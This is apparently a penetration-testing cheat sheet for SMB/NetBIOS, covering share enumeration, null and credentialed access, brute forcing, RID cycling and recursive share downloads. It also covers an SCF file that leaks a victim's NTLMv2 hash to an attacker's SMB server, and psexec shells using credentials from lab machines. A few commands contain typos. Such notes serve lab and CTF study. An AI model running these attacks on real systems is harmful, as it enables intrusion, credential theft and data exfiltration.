# SMB - 139/445

## SMB Information

It should be noted that SMB (TCP port 445) and NetBIOS (TCP port 139) are two separate protocols. Present day usage of SMB can work without NetBIOS, NetBIOS over TCP NBT is required for in reverse compatibility and is frequently empowered together. We know that Windows always has a reverse compatibility for almost everything so because of this (NetBIOS over TCP NBT) the enumeration of these services goes together.

### Port 139 - NetBIOS

Standing for Network Basic Input/Output System, NetBIOS is a networking industry standard developed by IBM, Microsoft, and Sytek. It is currently mostly used by Microsoft Windows operating systems to provide certain services to the other network hosts. NetBIOS provides services associated with the OSI model’s session layer, allowing applications on different computers to communicate over the local network. It also allows the proper transmission of data over the network. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over **TCP Port 139**.&#x20;

Reference:

{% embed url="https://www.bitwarsoft.com/what-is-netbios.html" %}

### Port 445 - SMB

While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. **SMB** stands for ‘**Server Message Blocks**’. Server Message Block in modern language is also known as **Common Internet File System (cifs)**. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

For instance, on Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use the port 445. On other systems, you’ll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP**.**&#x20;

### IPC$ Share

The IPC$ shares and interacts with other services via named pipes. The IPC$ share can contain the following information:

* Operating System&#x20;
* Parent Domain
* Local Users and Groups
* Available SMB shares
* Effective System Security Policies

### Shares

Here is a brief explanation of each share:

* `ADMIN$` = Only for administrators
* `C$` = This is the `C:\` drive
* `IPC$` = Remote Procedure Calls, allows **RID bruteforce** if we have READ permissions
* NETLOGON
* `SYSVOL` = Group Policy Information

## SMB Vulnerability Scanning <a href="#smb-list-shares" id="smb-list-shares"></a>

One of the first things I would do is a vulnerability scan to see if there's any CVE for the SMB service.

### Nmap SMB NSE Scripts

Nmap contains many useful NSE scripts that can be used to discover and enumerate SMB services. These scripts can be found in the `/usr/share/nmap/scripts` directory:

```
ls -l /usr/share/nmap/scripts/smb*
```

## SMB List Shares <a href="#smb-list-shares" id="smb-list-shares"></a>

### smbmap <a href="#smbmap" id="smbmap"></a>

List SMB shares permissions:

```
smbmap -H 10.10.10.10
```

Recursively list directories:

```
smbmap -H 10.10.10.100 -r Replication/active.htb
```

### smbclient <a href="#smbclient" id="smbclient"></a>

List SMB shares with smbclient:

```
smbclient -L 10.10.10.10
smbclient -L \\$ip -N --option='client min protocol=NT1'
```

### crackmapexec <a href="#crackmapexec" id="crackmapexec"></a>

List SMB shares with crackmapexec:

```
crackmapexec smb 10.10.10.10 --shares
```

### enum4linux <a href="#enum4linux" id="enum4linux"></a>

List SMB shares with enum4linux:

```
enum4linux 10.10.10.10
```

## SMB Authentication <a href="#smb-authentication" id="smb-authentication"></a>

### smbmap <a href="#smbmap-2" id="smbmap-2"></a>

Null authentication with smbmap:

```
smbmap -u '' -p '' -H 192.168.189.98

# Recursive Search
smbmap -u '' -p '' -R -H 192.168.189.98
smbmap -u null -p null -H <IP> -s ShareName$ -R
```

Authenticate to a domain controller SMB share with valid credentials:

```
smbmap -d domain.name -u username -p password -H 10.10.10.10
smbmap -H 10.10.10.103 -u amanda -p Ashare1972
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

### smbclient <a href="#smbclient-2" id="smbclient-2"></a>

Authenticate as null:

```
smbclient -U '' -L 10.10.10.10
```

Authenticate as the guest user:

```
smbclient -U 'guest' -L 10.10.10.10
```

Authenticate as valid user (type password on prompt):

```
smbclient -U 'username' -L 10.10.10.10
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18   
```

### crackmapexec <a href="#crackmapexec-2" id="crackmapexec-2"></a>

Authenticate as null:

```
crackmapexec smb 10.10.10.10 --shares -u '' -p ''
```

Authenticate as a valid user with crackmapexec:

```
crackmapexec smb 10.10.10.10 --shares -u username -p password
```

## SMB Bruteforce

We can start a bruteforce scan with the `username:username` format:

```
crackmapexec smb <IP> -u users.txt -p users.txt --continue-on-success
```

Test one password for multiple users:

```
crackmapexec smb <IP> -u users.txt -p 'password_here' --continue-on-success
```

The one user for multiple passwords:

```
crackmapexec smb <IP> -u 'username_here' -p passwords.txt --continue-on-success
```

The multiple users and multiple passwords:

```
crackmapexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
```

## RID Cycling

The `IPC$` share must readable for this to work:

```
crackmapexec smb <IP> -u <username> -p <password> --rid-brute
```

We can use RIDs to find users and groups:

```
enum4linux -U -G -r 192.168.189.98
```

## Recursive

You can download all the files recursively with smbclient (as long as we have permissions):

```
smb: \> recurse
smb: \> prompt off
smb: \> mget *
```

## SMB Protocol Error Fix <a href="#smb-connect-to-share" id="smb-connect-to-share"></a>

Error Code:

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

Some servers have an OLD SMBv1 protocol in use, to accept the connection we must specify the minimum protocol version we can accept with:

```
smbclient //$ip/share -N --option='client min protocol=NT1'
```

You can also add the following to `/etc/samba/smb.conf` under the `[global]` section:

```
client min protocol = NT1
```

If you modify its configuration file, you must restart the SMB daemon with:

```
sudo /etc/init.d/smbd restart
```

## SMB Debug Level <a href="#smb-connect-to-share" id="smb-connect-to-share"></a>

### smbclient Debug

We can debug smbclient with:

```
smbclient //<IP>/<share> -U user -N --debuglevel=10
```

## SMB Capture NTLMv2 with SCF <a href="#smb-connect-to-share" id="smb-connect-to-share"></a>

**SCF** (Shell Command File) are simple files that can be used to perform a connection to the attacker machine by using the **SMB** protocol. The interesting purpose of that kind of file is that they can perform a small and limited set of operations, but can be executed when the user will browse the file, without the explicit necessity to execute it.

The attacker can take profit from this vulnerability to make a request to his own machine and then get the NTLMv2 hash of the victim.

Create a shared folder and let it open:

```
impacket-smbserver share $(pwd) -smb2support
```

1.  Create the malicious SCF file

    ```
    [Shell]
    Command=2
    IconFile=\\10.10.10.11\share\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop
    ```
2. Copy the malicious file in the desired victim shared resource

Check the shared folder that you have created previously and if there is an interaction between the victim and the file, you will receive the NTLMv2 hash of the victim. You can then try to crack the hash with **john or hashcat.**

## SMB Connect to Share <a href="#smb-connect-to-share" id="smb-connect-to-share"></a>

### smbmap <a href="#smbmap-3" id="smbmap-3"></a>

Recursively list the share:

```
smbmap -R ShareName -H 10.10.10.10
```

### smbclient <a href="#smbclient-3" id="smbclient-3"></a>

We can connect to share with the following example:

```
smbclient -L //10.10.10.10/ShareName
```

## SMB Connect via Different Port

Sometimes you may have a tunnel on another port, you may use the following example:

```
smbclient -L target_ip --port=4455 --user=Administrator 
```

## SMB Download

Download one-liners:

```
smbclient //10.10.10.100/Replication -N -c 'prompt OFF;recurse ON; lcd ".";mget *'
smbclient '\\<IP>\Share' -N -c 'prompt OFF;recurse ON; mget *'
smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'
```

## SMB Mount Share <a href="#smb-mount-share" id="smb-mount-share"></a>

Create a directory to mount the share:

```
sudo mkdir -p /mnt/smb
```

Mount the remote share to your machines/host without credentials:

```
sudo mount -t cifs //10.10.10.10/ShareName/ /mnt/smb
```

Mount with valid credentials method:

```
sudo mount -t cifs -o 'user=username,password=pass' //10.10.10.10/sharename$ /mnt/share
sudo mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt
```

Mount with custom port:

```
sudo mount -t cifs -o port=4455 //target_ip/Directory -o username=Administrator,password=Valid_Password /mnt/dir_name
```

Tip, if there are a few files (not too much) you might want to copy the files into your localhost:

```
cp * /home/kali/htb/sizzle/loot/
```

### SMB Mounted Share Usage

Mount a CIFS share:

```bash
mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' /mnt
```

Navigate to the `/mnt` share:

```bash
cd /mnt
```

Enumerate writable directories:

```bash
#!/bin/bash
list=$(find /mnt - type d)
for d in $list
do
    touch $d /x 2>/dev/null
    if [ $? -eq 0 ]
    then
        echo $d " is writable"
    fi
done
```

## SMB Password Spray <a href="#smb-password-spray" id="smb-password-spray"></a>

## SMB Abuse

If we have write permissions to a writable SMB share we can authenticate and establish a shell with `psexec.py`:

```
sudo python psexec.py domain.local/administrator:'p@$$w0rd!'@<IP>
```

## SMB Bruteforce

Before doing a bruteforce, checkout the password policy threshold:

```
cmd smb 10.10.10.172 --pass-pol
```

If the password threshold is 0 we can bruteforce all we want if there's no IPS/IDS:

```
cme smb 10.10.10.172 -u users.txt -p users.txt | grep -vi failure
```

crackmapexec will put out a line for every attempt, therefore we can use grep to get just the ones with [+] which means success:

```
crackmapexec smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success | grep -F '[+]
```

## SMB Usage Cheatsheet <a href="#smb-usage-cheatsheet" id="smb-usage-cheatsheet"></a>

Download all files recursively without prompts:

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
